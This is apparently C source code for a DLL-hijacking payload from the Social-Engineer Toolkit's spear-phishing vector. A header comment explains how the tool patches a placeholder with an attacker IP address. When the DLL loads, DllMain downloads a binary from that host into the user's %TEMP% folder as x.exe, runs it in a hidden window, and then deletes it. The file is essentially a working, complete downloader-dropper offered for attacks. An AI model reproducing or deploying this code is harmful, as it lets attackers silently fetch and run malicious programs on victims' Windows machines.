/* 

DLL Hijacker Attack Written by Dave Kennedy (ReL1K) for the  Social-Engineer Toolkit (SET) spear-phishing attack vector. 

[] SET DLL Version: 0.1 []

This DLL once executed will utilize a staged downloader that is read into memory then
written to a file. It takes advantage of write permissions within the users %TEMP% directory. 
Had to do a unique method in doing dynamic DLL analysis in SET. If you notice the string 

char* host = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";

SET will read in the binary and look for the static X's. Once it's found it will take the length
of the IP address to replace and take into consideration length and replace the X's with the IP
address. The only issue is if it is written to the buffer it would look something like:

http://172.16.32.132XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/x

In order to get around this problem I added a null byte terminator at the end of the IP address. When
the DLL executes, the string is forumated with the IP address a null byte terminator and the rest of the
ascii X's. Once the null byte is hit it will stop execution and write out the appropriate format:

http://172.16.32.132/x

Here's a snippet of the python code from SET:

# replace ipaddress with one that we need for reverse connection back
fileopen=open("src/dll_hijacking/hijacking.dll" , "rb")
data=fileopen.read()

filewrite=open("~/.set/dll/%s" % (dll), "wb")

host=int(len(ipaddr)+1) * "X"

filewrite.write(data.replace(str(host), ipaddr+"\x00", 1))
filewrite.close()

Once the DLL is executed and the payload downloaded from the SET web server, a seperate thread is created
and the payload executed. Once closed and the thread terminates, the executable should be deleted however
this isn't 100 percent.

Just a heads up if your using Dev-C++ to compile this you will need to go into Project -> Project Options -> Parameters -> Linkers and add: -lWininet 

*/

#include <stdafx.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>

int WINAPI GetData(HINTERNET hResource, LPBYTE& lpData, DWORD& pdwDataLength);

int main()
{
	// create a buffer for the temp directory path, technically if the path is longer then this there would be issues but this is a hack job :P
	char path[5000]; 
    char* tmpdir = getenv("TMP");
    if (!tmpdir)
	// grab the temp directory %TEMP% in Windows
    tmpdir = getenv("TEMP");
	// print our temp directory to our buffer we created 'path'
	sprintf(path, "%s\\x.exe", tmpdir);
    // used to do dynamic DLL writing on the fly through SET, IP Address goes here with null byte terminator
	char* host = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"; 
	char* url = new char[2000]; // create a buffer for our replaced IP address
	sprintf(url,"http://%s/x", host); // should end up being http://ipaddressorhost/x
	LPCSTR userAgent = "The Social-Engineer Toolkit (SET)"; // SET doesn't care what your user-agent string is

	// start the internet connection and handle downloading the data
	HINTERNET hNet = InternetOpen(userAgent,
		PRE_CONFIG_INTERNET_ACCESS,
		NULL,
		INTERNET_INVALID_PORT_NUMBER,
		0);

	HINTERNET hUrl = InternetOpenUrl(hNet,
		url,
		NULL,
		0,
		INTERNET_FLAG_RELOAD,
		0);

	LPBYTE lpData = NULL;
	DWORD dwLength = 0;
	GetData(hUrl, lpData, dwLength);
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hNet);

	// Do something with the data in lpData here.
	// Size of data is in dwLength

	
	FILE *file;
	// write out a file to our temp directory, temp equals %TEMP%\x.exe
	file = fopen(path, "wb"); // write file x.vbs
	// for the length of the file write out the binary data from our buffer
	for (DWORD i=0; i<dwLength;i++)
	{
		BYTE c = lpData[i];
		fputc(c, file);
	}      
	// close our file
	fclose(file);
	// clean up our binary data in the buffer
	delete[] lpData;
	return 0;
}

int WINAPI GetData(HINTERNET hResource, LPBYTE& lpData, DWORD& pdwDataLength)
{
	LPBYTE lpBuf;       // buffer for the data
	DWORD dwSize;       // size of the data available
	DWORD  dwDownloaded; // size of the downloaded data
	DWORD  dwSizeSum=0;  // size of the data in the textbox
	LPBYTE lpHolding;    // buffer to merge the data and buffer

	// This loop handles reading the data.  
	do
	{
		// The call to InternetQueryDataAvailable determines the
		// amount of data available to download.
		if (!InternetQueryDataAvailable(hResource,&dwSize,0,0))
		{
			//printf("InternetQueryDataAvailable failed (%d)\n", GetLastError());
			return FALSE;
		}
		else
		{
			if (dwSize == 0)
			{
				break;
			}

			// Allocate a buffer of the size returned by
			// InternetQueryDataAvailable.
			lpBuf = new BYTE[dwSize];

			// Read the data from the HINTERNET handle.
			if(!InternetReadFile(hResource,
				(LPVOID)lpBuf,
				dwSize,
				&dwDownloaded))
			{
				//printf("InternetReadFile failed (%d)\n", GetLastError());
				delete[] lpBuf;
				break;
			}
			else
			{
				// Allocate the holding buffer.
				lpHolding = new BYTE[dwSizeSum + dwDownloaded];

				// current holding buffer position
				size_t pos = 0;

				// Check if there has been any data written,
				// save it to holding then delete.
				if (dwSizeSum != 0)
				{
					memcpy(lpHolding, lpData, dwSizeSum);
					pos = dwSizeSum;
					delete[] lpData;
				}

				// concat downloaded data to holding buffer
				memcpy(lpHolding+pos, lpBuf, dwDownloaded);

				// save holding pointer to our return param
				lpData = lpHolding;

				// Add the size of the downloaded data to the 
				// data size.
				dwSizeSum = dwSizeSum + dwDownloaded;

				// remove temp download buffer
				delete[] lpBuf;
			}
		}  
	}  
	while(TRUE);
	// enable these printf statements if you want but shouldn't be needed
	// printf("Finished. Downloaded %d bytes.", dwSizeSum);
	 pdwDataLength = dwSizeSum;

	return TRUE;
}

// start our entry point for our DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
    // call our main function
    main();
    // create a buffer for the temp directory path, technically if the path is longer then this there would be issues but this is a hack job :P
    char path[5000]; 
    char* tmpdir = getenv("TMP");
    if (!tmpdir)
	// grab the temp directory %TEMP% in Windows
	tmpdir = getenv("TEMP");
	// print our temp directory to our buffer we created 'path'
	sprintf(path, "%s\\x.exe", tmpdir);
	// here is where we start a new process and execute a command
	// this was the cleanest method as we create a complety seperate instance
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );
	si.dwFlags    = STARTF_USESHOWWINDOW;
	si.wShowWindow    = SW_HIDE; // hide the window

	// Start the child process. 
	if( !CreateProcess( NULL,   // No module name (use command line)
		path,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi )           // Pointer to PROCESS_INFORMATION structure
		) 

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

	// Close process and thread handles. 
	CloseHandle( pi.hProcess );
	CloseHandle( pi.hThread );
	remove(path); 
	return 0;
}



